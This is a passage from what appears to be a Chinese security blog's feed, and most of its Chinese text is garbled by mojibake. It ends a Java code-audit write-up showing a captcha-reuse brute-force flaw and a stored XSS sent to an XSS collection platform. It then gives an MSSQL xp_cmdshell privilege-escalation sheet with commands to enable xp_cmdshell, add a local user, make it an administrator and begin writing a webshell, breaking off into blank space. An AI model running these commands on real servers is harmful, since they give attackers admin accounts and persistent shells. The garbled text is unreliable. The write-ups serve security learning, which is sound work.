src="/../images/Java/jxc/image-20221126211906103.png" alt="image-20221126211906103"></a></p><p>ç»¼ä¸Šåˆ†æå¾—çŸ¥ï¼Œå¼€å‘è€…å¯¹ <code>/**</code> (ä»»æ„å±‚è·¯å¾„)ä½¿ç”¨äº† authc æ‹¦æˆªå™¨è¿›è¡Œäº†æ‹¦æˆªï¼Œæ‰€ä»¥è¯¥é¡¹ç›®ä¸å­˜åœ¨ Shiro æƒé™ç»•è¿‡æ¼æ´ã€‚</p><hr><h4 id="SQLæ³¨å…¥ï¼ˆä¸å­˜åœ¨ï¼‰"><a href="#SQLæ³¨å…¥ï¼ˆä¸å­˜åœ¨ï¼‰" class="headerlink" title="SQLæ³¨å…¥ï¼ˆä¸å­˜åœ¨ï¼‰"></a>SQLæ³¨å…¥ï¼ˆä¸å­˜åœ¨ï¼‰</h4><p>ç”±ä¸Šé¢çš„ pom.xml å®¡è®¡ä¸­ï¼Œæˆ‘ä»¬å‘ç°ç³»ç»Ÿä½¿ç”¨ Mybatis æ¡†æ¶ï¼Œé€šè¿‡ä»¥å¾€çš„æ–‡ç« å­¦ä¹ ï¼Œæˆ‘ä»¬çŸ¥é“ Mybatis å®¡è®¡ SQL æ³¨å…¥å…³é”®ç‚¹åœ¨ä¸è¯­å¥æ˜¯å¦ä½¿ç”¨äº† <code>$&#123;&#125;</code> å’Œ <code>#&#123;&#125;</code>,è‹¥ä½¿ç”¨äº†<code>#&#123;&#125;</code> å³é‡‡å–äº†é¢„ç¼–è¯‘ï¼Œåˆ™æ˜¯ä¸å­˜åœ¨æ³¨å…¥äº†ï¼Œè‹¥ä½¿ç”¨äº† <code>$&#123;&#125;</code> åˆ™ä¸ºç›´æ¥æ‹¼æ¥ï¼Œå¦‚æœä¸å­˜åœ¨è¿‡æ»¤åˆ™å¯èƒ½å­˜åœ¨SQLæ³¨å…¥ã€‚</p><p>åœ¨ Spring Boot æ¡†æ¶ä¸­ï¼Œä¸€èˆ¬ä¸º Controller å±‚æ¥æ”¶å‰ç«¯è¯·æ±‚ç„¶åè°ƒç”¨ Service å±‚ï¼Œç„¶å Service å±‚çš„ä¸šåŠ¡é€»è¾‘å»è°ƒç”¨ Dao è®¿é—®æ•°æ®åº“åšå¢åˆ æ”¹æŸ¥æ“ä½œï¼ŒDao å†è°ƒç”¨ resources ä¸­çš„å¯¹åº”çš„ .xml æ–‡ä»¶åšå…·ä½“çš„ SQL è¯­å¥ï¼ŒSQL è¯­å¥éƒ½æ˜¯åœ¨ .xml æ–‡ä»¶ä¸­å†™çš„ï¼Œè€Œä¸æ˜¯åœ¨ Java ä»£ç ä¸­ç›´æ¥åˆ©ç”¨ Connection è¿æ¥æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢ï¼Œè¿™æ ·å±‚æ¬¡æ›´æ¸…æ™°ï¼Œä»£ç ä¹Ÿæ›´å®¹æ˜“ç»´æŠ¤ã€‚å› ä¸ºå…·ä½“çš„ SQL è¯­å¥éƒ½åœ¨ .xml æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å®¡è®¡æ—¶å¯ä»¥ç›´æ¥æœç´¢ .xml æ–‡ä»¶ä¸­æ˜¯å¦å­˜åœ¨çš„ ${ ç¬¦å·ï¼Œä»¥å¿«é€Ÿå¯»æ‰¾æ˜¯å¦å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128103655415.png" data-caption="image-20221128103655415"><img src="/../images/Java/jxc/image-20221128103655415.png" alt="image-20221128103655415"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128103844420.png" data-caption="image-20221128103844420"><img src="/../images/Java/jxc/image-20221128103844420.png" alt="image-20221128103844420"></a></p><br/><hr><h4 id="éªŒè¯ç ç»•è¿‡ï¼ˆå­˜åœ¨ï¼‰"><a href="#éªŒè¯ç ç»•è¿‡ï¼ˆå­˜åœ¨ï¼‰" class="headerlink" title="éªŒè¯ç ç»•è¿‡ï¼ˆå­˜åœ¨ï¼‰"></a>éªŒè¯ç ç»•è¿‡ï¼ˆå­˜åœ¨ï¼‰</h4><p>å®¡è®¡éªŒè¯ç æ˜¯å¦å¯ç»•è¿‡ï¼Œæˆ‘ä»¬å…ˆå®šä½å…¶è·¯ç”±ï¼Œç„¶åæ ¹æ®å…¶ä½ç½®ä¸€æ­¥æ­¥åˆ†æå…¶ä»£ç æ˜¯å¦å­˜åœ¨éªŒè¯ç ç»•è¿‡çš„å¯èƒ½ã€‚æˆ‘ä»¬é€šè¿‡æŠ“åŒ…å®šä½å…¶è·¯ç”±ä¸º <code>/user/login</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128105602081.png" data-caption="image-20221128105602081"><img src="/../images/Java/jxc/image-20221128105602081.png" alt="image-20221128105602081"></a></p><p>æ‰€ä»¥ IDEA ä¸­æœç´¢ <code>/user</code> æˆ–è€…<code>/login</code> å®šä½åˆ°è¯¥ä½ç½®</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128110144473.png" data-caption="image-20221128110144473"><img src="/../images/Java/jxc/image-20221128110144473.png" alt="image-20221128110144473"></a></p><p>é€šè¿‡å®¡è®¡å®šä½åˆ°ä»£ç ä¸º Controller å±‚çš„ <code>UserController.java</code>ï¼Œæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œé€šè¿‡ä¸Šé¢æ³¨é‡Šå¯çŸ¥é“ï¼Œsession ç”¨äºå–å‡ºç³»ç»Ÿç”Ÿæˆçš„éªŒè¯ç ã€‚ä¸¤ä¸ªå‚æ•°ä½¿ç”¨ <code>login</code> æ–¹æ³•å»è°ƒç”¨ï¼Œæˆ‘ä»¬è·Ÿè¿› <code>login</code> æ–¹æ³•è¿›ä¸€æ­¥å®¡è®¡</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128111023068.png" data-caption="image-20221128111023068"><img src="/../images/Java/jxc/image-20221128111023068.png" alt="image-20221128111023068"></a></p><p><code>Ctrl + é¼ æ ‡å·¦é”®</code> è·Ÿè¿›æ–¹æ³•ï¼Œæˆ‘ä»¬æ¥åˆ°äº† <code>Service</code> æ¥å£å±‚ï¼Œä¹Ÿå°±æ˜¯ <code>Dao</code> å±‚çš„ UserService.javaï¼Œå› ä¸º Service æ¥å£è°ƒç”¨çš„æ˜¯ Dao å±‚çš„æ¥å£ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±åº”è¯¥æ‰¾æ¥å£çš„å…·ä½“å®ç°ä»£ç è¿›è¡Œå®¡è®¡</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128111444927.png" data-caption="image-20221128111444927"><img src="/../images/Java/jxc/image-20221128111444927.png" alt="image-20221128111444927"></a></p><p><code>Ctrl + é¼ æ ‡å·¦é”®</code> UserService æ¥å£ï¼Œæ‰¾åˆ°å…·ä½“çš„å®ç°ä»£ç </p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128111929222.png" data-caption="image-20221128111929222"><img src="/../images/Java/jxc/image-20221128111929222.png" alt="image-20221128111929222"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128111953407.png" data-caption="image-20221128111953407"><img src="/../images/Java/jxc/image-20221128111953407.png" alt="image-20221128111953407"></a></p><p>æ¥ä¸‹æ¥çš„å·¥ä½œå°±æ˜¯å®¡è®¡è¯¥ä»£ç å³å¯ï¼Œé€šè¿‡å®¡è®¡æˆ‘ä»¬å¾—çŸ¥ <code>if(!userLogin)</code> å¦‚æœã€éï¼Œå³å¦‚æœè¾“å‡ºçš„éªŒè¯ç éç³»ç»ŸéªŒè¯ç åˆ™è¿”å› ServiceVO é‡Œé¢çš„é”™è¯¯ï¼Œæ­£ç¡®åˆ™è·³è¿›ä¸‹ä¸€æ­¥è¿›è¡Œç™»å½•æ ¡éªŒã€‚è¿™é‡Œçš„ä»£ç æ²¡æœ‰å®šä¹‰åˆ·æ–°éªŒè¯ç æœºåˆ¶ï¼Œä½¿æˆ‘ä»¬åªéœ€è¦è¾“å…¥ä¸€æ¬¡æ­£ç¡®çš„éªŒè¯ç å³å¯ç»§ç»­ä½¿ç”¨è¯¥éªŒè¯ç ã€‚</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ ¡éªŒå›¾ç‰‡éªŒè¯ç æ˜¯å¦æ­£ç¡®</span></span><br><span class="line"><span class="keyword">if</span>(!userLogin.getImageCode().toUpperCase().equals(session.getAttribute(<span class="string">&quot;checkcode&quot;</span>)))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ServiceVO</span>(ErrorCode.VERIFY_CODE_ERROR_CODE, ErrorCode.VERIFY_CODE_ERROR_MESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128112759128.png" data-caption="image-20221128112759128"><img src="/../images/Java/jxc/image-20221128112759128.png" alt="image-20221128112759128"></a></p><p>æ¼æ´å¤ç°ï¼Œæˆ‘ä»¬è¾“å…¥æ­£ç¡®çš„éªŒè¯ç ï¼ŒæŠ“åŒ…è¿›è¡Œçˆ†ç ´</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128114103675.png" data-caption="image-20221128114103675"><img src="/../images/Java/jxc/image-20221128114103675.png" alt="image-20221128114103675"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128114130277.png" data-caption="image-20221128114130277"><img src="/../images/Java/jxc/image-20221128114130277.png" alt="image-20221128114130277"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128114152465.png" data-caption="image-20221128114152465"><img src="/../images/Java/jxc/image-20221128114152465.png" alt="image-20221128114152465"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128114229865.png" data-caption="image-20221128114229865"><img src="/../images/Java/jxc/image-20221128114229865.png" alt="image-20221128114229865"></a></p><br/><hr><h4 id="å­˜å‚¨å‹XSSï¼ˆå­˜åœ¨ï¼‰"><a href="#å­˜å‚¨å‹XSSï¼ˆå­˜åœ¨ï¼‰" class="headerlink" title="å­˜å‚¨å‹XSSï¼ˆå­˜åœ¨ï¼‰"></a>å­˜å‚¨å‹XSSï¼ˆå­˜åœ¨ï¼‰</h4><p>æˆ‘ä»¬çŸ¥é“åªè¦å­˜åœ¨è¾“å…¥ç‚¹ï¼Œå°±æœ‰å¯èƒ½å­˜åœ¨ XSS æ¼æ´ï¼Œæ‰€ä»¥å®¡è®¡æ—¶æˆ‘ä»¬é¦–å…ˆå®¡è®¡æ˜¯å¦å­˜åœ¨XSSå…¨å±€è¿‡æ»¤å™¨ã€‚ä¸€èˆ¬æœç´¢ filter è¿›è¡Œåˆ†æï¼Œè¿™é‡Œæˆ‘ä»¬çŸ¥é“ä½¿ç”¨çš„æ˜¯ Spring boot æ¡†æ¶å¹¶ä½¿ç”¨äº† Shiroï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è½¬åˆ° Shiro ä¸­çš„ filter è¿‡æ»¤å™¨æŸ¥çœ‹æ˜¯å¦å¯¹ XSS è¿›è¡Œäº†è¿‡æ»¤ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128125843474.png" data-caption="image-20221128125843474"><img src="/../images/Java/jxc/image-20221128125843474.png" alt="image-20221128125843474"></a></p><p>é€šè¿‡åˆ†æï¼Œå‘ç°ç³»ç»Ÿåªå¯¹éƒ¨åˆ†çš„è·¯å¾„è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¹¶æ²¡æœ‰å¯¹XSSè¿›è¡Œè¿‡æ»¤</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128130003820.png" data-caption="image-20221128130003820"><img src="/../images/Java/jxc/image-20221128130003820.png" alt="image-20221128130003820"></a></p><p>è¿™æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•åœ¨åŠŸèƒ½ç‚¹å¤„è¾“å…¥ XSS è¯­å¥è¿›è¡Œå°è¯•ï¼ŒæŸ¥çœ‹æ˜¯å¦èƒ½è§¦å‘æ¼æ´ã€‚é¦–å…ˆæˆ‘ä»¬åœ¨é¡µé¢æœç´¢åŠŸèƒ½ç‚¹å¹¶ä¸èƒ½è§¦å‘æ¼æ´</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128130137222.png" data-caption="image-20221128130137222"><img src="/../images/Java/jxc/image-20221128130137222.png" alt="image-20221128130137222"></a></p><p>ç»è¿‡æµ‹è¯•ï¼Œæˆ‘ä»¬å‘ç°åœ¨ç³»ç»Ÿçš„æœç´¢åŠŸèƒ½å¹¶ä¸èƒ½è§¦å‘ XSSï¼Œåœ¨ä¿®æ”¹åŠŸèƒ½ï¼Œå¯ä»¥å°†æ•°æ®æ’å…¥æ•°æ®åº“çš„åŠŸèƒ½å¯è§¦å‘æ¼æ´</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128130626302.png" data-caption="image-20221128130626302"><img src="/../images/Java/jxc/image-20221128130626302.png" alt="image-20221128130626302"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128130607082.png" data-caption="image-20221128130607082"><img src="/../images/Java/jxc/image-20221128130607082.png" alt="image-20221128130607082"></a></p><p>è¿›ä¸€æ­¥æµ‹è¯•å‘ç°ï¼Œåªè¦æ˜¯æ’å…¥æ•°æ®åº“çš„åŠŸèƒ½ç‚¹éƒ½èƒ½è§¦å‘æ¼æ´</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128131010064.png" data-caption="image-20221128131010064"><img src="/../images/Java/jxc/image-20221128131010064.png" alt="image-20221128131010064"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128130953106.png" data-caption="image-20221128130953106"><img src="/../images/Java/jxc/image-20221128130953106.png" alt="image-20221128130953106"></a></p><p>å½“æˆ‘ä»¬ä½¿ç”¨å…¶ä»–è´¦å·ç™»å½•ï¼Œå‘ç°ä¹Ÿèƒ½è§¦å‘ XSSï¼Œè¯æ˜è¯¥ XSS ä¸ºå­˜å‚¨å‹ XSS</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128131225694.png" data-caption="image-20221128131225694"><img src="/../images/Java/jxc/image-20221128131225694.png" alt="image-20221128131225694"></a></p><p>é€šè¿‡æŠ“åŒ…æ‰¾åˆ°è¯¥è·¯ç”±ä¸º &#x2F;supplier&#x2F;list</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128131433784.png" data-caption="image-20221128131433784"><img src="/../images/Java/jxc/image-20221128131433784.png" alt="image-20221128131433784"></a></p><p>IDEA å…¨å±€æœç´¢å®šä½åˆ° Controller å±‚ <code>SupplierController.java</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128131630406.png" data-caption="image-20221128131630406"><img src="/../images/Java/jxc/image-20221128131630406.png" alt="image-20221128131630406"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128131818693.png" data-caption="image-20221128131818693"><img src="/../images/Java/jxc/image-20221128131818693.png" alt="image-20221128131818693"></a></p><p>é€šè¿‡å¯¹æ¯”ï¼Œå‚æ•° pageã€rows å¯¹åº” Burp æŠ“åˆ°åˆ°å‚æ•°åŸºæœ¬ä¸€è‡´ï¼Œç¡®å®šä¸ºè¯¥è·¯å¾„</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128132127301.png" data-caption="image-20221128132127301"><img src="/../images/Java/jxc/image-20221128132127301.png" alt="image-20221128132127301"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128132225563.png" data-caption="image-20221128132225563"><img src="/../images/Java/jxc/image-20221128132225563.png" alt="image-20221128132225563"></a></p><p><code>Ctrl + é¼ æ ‡å·¦é”®</code> è·Ÿè¿› list æ–¹æ³•ï¼Œæˆ‘ä»¬æ¥åˆ°äº† Service å±‚çš„ <code>SupplierService.java</code>,å®šä½åˆ° <code>SupplierService</code> æ¥å£</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128132450975.png" data-caption="image-20221128132450975"><img src="/../images/Java/jxc/image-20221128132450975.png" alt="image-20221128132450975"></a></p><p><code>Ctrl + é¼ æ ‡å·¦é”®</code> è¿›è¡Œè·Ÿè¿›è¯¥æ¥å£ï¼Œæ‰¾åˆ°å…·ä½“å®ç°ä»£ç ä½ç½®ä¸º <code>SupplierServiceImpl.java</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128132721752.png" data-caption="image-20221128132721752"><img src="/../images/Java/jxc/image-20221128132721752.png" alt="image-20221128132721752"></a></p><p>ä»£ç é€»è¾‘æ¸…æ™°ï¼Œæ²¡æœ‰å¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128132640798.png" data-caption="image-20221128132640798"><img src="/../images/Java/jxc/image-20221128132640798.png" alt="image-20221128132640798"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128132902071.png" data-caption="image-20221128132902071"><img src="/../images/Java/jxc/image-20221128132902071.png" alt="image-20221128132902071"></a></p><p>XSSå®æˆ˜ä¸­çš„ä½¿ç”¨,ä½¿ç”¨ XSS å¹³å°ï¼Œåˆ›å»ºä¸€ä¸ªé¡¹ç›®</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128141001324.png" data-caption="image-20221128141001324"><img src="/../images/Java/jxc/image-20221128141001324.png" alt="image-20221128141001324"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128141022057.png" data-caption="image-20221128141022057"><img src="/../images/Java/jxc/image-20221128141022057.png" alt="image-20221128141022057"></a></p><p>è¿™é‡Œé€‰æ‹©é»˜è®¤æ¨¡å—</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128141043009.png" data-caption="image-20221128141043009"><img src="/../images/Java/jxc/image-20221128141043009.png" alt="image-20221128141043009"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128133535652.png" data-caption="image-20221128133535652"><img src="/../images/Java/jxc/image-20221128133535652.png" alt="image-20221128133535652"></a></p><p>éšä¾¿é€‰æ‹©ä¸€ä¸ªä»£ç æ’å…¥åˆ°å­˜åœ¨æ¼æ´çš„æ¡†æ¡†ä¸­</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128141147400.png" data-caption="image-20221128141147400"><img src="/../images/Java/jxc/image-20221128141147400.png" alt="image-20221128141147400"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128133858249.png" data-caption="image-20221128133858249"><img src="/../images/Java/jxc/image-20221128133858249.png" alt="image-20221128133858249"></a></p><p>è¿”å› XSS å¹³å°è¿™é‡Œå·²ç»è¿”å›éƒ¨åˆ†ä¿¡æ¯</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128133752931.png" data-caption="image-20221128133752931"><img src="/../images/Java/jxc/image-20221128133752931.png" alt="image-20221128133752931"></a></p><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>è¿™æ¬¡é¡¹ç›®å®¡è®¡è¿›ä¸€æ­¥äº†è§£ Shiro ç™»å½•è®¤è¯æœºåˆ¶ï¼Œå†é€šè¿‡å®¡è®¡åŠŸèƒ½ç‚¹è¿›ä¸€æ­¥äº†è§£å®¡è®¡åŸºç¡€ï¼Œå®¡è®¡çš„æ¼æ´æ•°é‡è™½ç„¶ä¸å¤šï¼Œä½†åŠ æ·±äº†å®¡è®¡çš„æŠ€å·§ã€‚</p><h2 id="äº”ã€å‚è€ƒ"><a href="#äº”ã€å‚è€ƒ" class="headerlink" title="äº”ã€å‚è€ƒ"></a>äº”ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/vuls/283810.html</span><br><span class="line">https://mp.weixin.qq.com/s/Y90mGgCqzjj0T1NX9E5wDw</span><br><span class="line">https://www.bilibili.com/video/BV1R24y1f7PY/?spm_id_from=333.999.0.0&amp;vd_source=193491f7ce412a6c60a101325cdd0aa0</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEBæ¼æ´ç³»åˆ—-MSSQLææƒä¹‹xp_cmdshell</title>
      <link href="/2022/11/26/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-MSSQL%E6%8F%90%E6%9D%83%E4%B9%8Bxp_cmdshell/"/>
      <url>/2022/11/26/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-MSSQL%E6%8F%90%E6%9D%83%E4%B9%8Bxp_cmdshell/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p><code>xp_cmdshell</code> æ˜¯ Microsoft SQL Server ä¸­çš„ä¸€ä¸ªç³»ç»Ÿå­˜å‚¨è¿‡ç¨‹ï¼Œå…è®¸ä»SQLæŸ¥è¯¢ä¸­æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚å®ƒåœ¨ä¹‹å‰çš„SQL Serverç‰ˆæœ¬ä¸­å¯ç”¨ï¼Œä»SQL Server 2012å¼€å§‹è¢«å¼ƒç”¨ã€‚ææƒå‰æ</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getshell æˆ–è€…å­˜åœ¨ sql æ³¨å…¥å¹¶ä¸”èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ï¼ˆsqlmap sql-shellï¼‰ã€‚</span><br><span class="line">sql server æ˜¯ system æƒé™ï¼ˆsql server é»˜è®¤å°±æ˜¯ system æƒé™ï¼‰ã€‚</span><br></pre></td></tr></table></figure></div><h2 id="äºŒã€xp-cmdshell-ç›¸å…³å‘½ä»¤"><a href="#äºŒã€xp-cmdshell-ç›¸å…³å‘½ä»¤" class="headerlink" title="äºŒã€xp_cmdshell ç›¸å…³å‘½ä»¤"></a>äºŒã€xp_cmdshell ç›¸å…³å‘½ä»¤</h2><p>æœ‰äº† xp_cmdshell çš„è¯å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè¯¥ç»„ä»¶é»˜è®¤æ˜¯å…³é—­çš„ï¼Œå› æ­¤éœ€è¦æŠŠå®ƒæ‰“å¼€ã€‚</p><br/><h3 id="å¼€å¯-xp-cmdshell"><a href="#å¼€å¯-xp-cmdshell" class="headerlink" title="å¼€å¯ xp_cmdshell"></a>å¼€å¯ xp_cmdshell</h3><p>å¯åœ¨ sqlmap è·å– sql-shell åæ‰§è¡Œå‘½ä»¤ï¼ŒåŸç†å°±æ˜¯åˆ©ç”¨ sp_configure è¿›è¡Œæ‰§è¡Œå‘½ä»¤ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;,1;reconfigure;</span><br></pre></td></tr></table></figure></div><br/><h3 id="å…³é—­-xp-cmdshell"><a href="#å…³é—­-xp-cmdshell" class="headerlink" title="å…³é—­ xp_cmdshell"></a>å…³é—­ xp_cmdshell</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;, 0;reconfigure</span><br></pre></td></tr></table></figure></div><br/><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;net user test pinohd123. /add&#x27;    æ·»åŠ ç”¨æˆ·testï¼Œå¯†ç test</span><br><span class="line">exec master..xp_cmdshell &#x27;net localgroup administrators test /add&#x27;    æ·»åŠ testç”¨æˆ·åˆ°ç®¡ç†å‘˜ç»„</span><br></pre></td></tr></table></figure></div><br/><h3 id="å†™å…¥-webshell"><a href="#å†™å…¥-webshell" class="headerlink" title="å†™å…¥ webshell"></a>å†™å…¥ webshell</h3><p>å¾—çŸ¥ç½‘ç«™è·¯å¾„åï¼Œåœ¨ sql-shell ä¸­æ‰§è¡Œå†™ shellï¼Œå¦‚æœæ‰§è¡Œä¸äº†ï¼Œå¯ä»¥å°è¯• hex ç¼–ç ç»•è¿‡ï¼Œä¸‹é¢ç»™å‡ºä¸¤ä¸ªä¾‹å­</p><p>&#96;&#96;&#96;<br>EXEC master..xp_cmdshell â€˜echo ^&lt;%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 </p>]]></content>
      
      
      <categories>
          
          <category> WEBæ¼æ´ç³»åˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> æ¼æ´å­¦ä¹  </tag>
            
            <tag> xp_cmdshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APPæµ‹è¯•ç³»åˆ—-Androidå®¢æˆ·ç«¯æµé‡æŠ“åŒ…</title>
      <link href="/2022/11/21/APP%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%81%E9%87%8F%E6%8A%93%E5%8C%85-Android%E7%AB%AF/"/>
      <url>/2022/11/21/APP%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%81%E9%87%8F%E6%8A%93%E5%8C%85-Android%E7%AB%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼ŒAndroid ä» 7.0 å¼€å§‹ï¼Œç³»ç»Ÿä¸å†ä¿¡ä»»ç”¨æˆ· CA è¯ä¹¦ï¼ˆåº”ç”¨ targetSdkVersion &gt;&#x3D; 24 æ—¶ç”Ÿæ•ˆï¼Œå¦‚æœ targetSdkVersion &lt; 24 å³ä½¿ç³»ç»Ÿæ˜¯ 7.0 + ä¾ç„¶ä¼šä¿¡ä»»ï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´å³ä½¿å®‰è£…äº†ç”¨æˆ· CA è¯ä¹¦ï¼Œåœ¨ Android 7.0 + çš„æœºå™¨ä¸Šï¼ŒtargetSdkVersion&gt;&#x3D; 24 çš„åº”ç”¨çš„ HTTPS åŒ…å°±æŠ“ä¸åˆ°äº†ã€‚æ–‡ç« ä¸»è¦åˆ†ä¸ºä¸‰å¤§éƒ¨åˆ†ï¼ˆæ³¨ï¼šè¯·é€šè¯»å…¨æ–‡å†é€‰æ‹©åˆé€‚è‡ªå·±çš„æ–¹æ³•ï¼ï¼‰</p><h2 id="äºŒã€å®‰å“æ¨¡æ‹Ÿå™¨æŠ“åŒ…"><a href="#äºŒã€å®‰å“æ¨¡æ‹Ÿå™¨æŠ“åŒ…" class="headerlink" title="äºŒã€å®‰å“æ¨¡æ‹Ÿå™¨æŠ“åŒ…"></a>äºŒã€å®‰å“æ¨¡æ‹Ÿå™¨æŠ“åŒ…</h2><p>æ¨¡æ‹Ÿå™¨æŠ“åŒ…çš„ä¼˜ç‚¹å°±æ˜¯ä¸éœ€è¦çœŸå®çš„æ‰‹æœºè®¾å¤‡ï¼Œç”µè„‘ä¸Šä¸‹è½½ä¸ªè½¯ä»¶ï¼Œè®¾ç½®ç›¸å…³é…ç½®å°±å¯ä»¥æŠ“å– APP 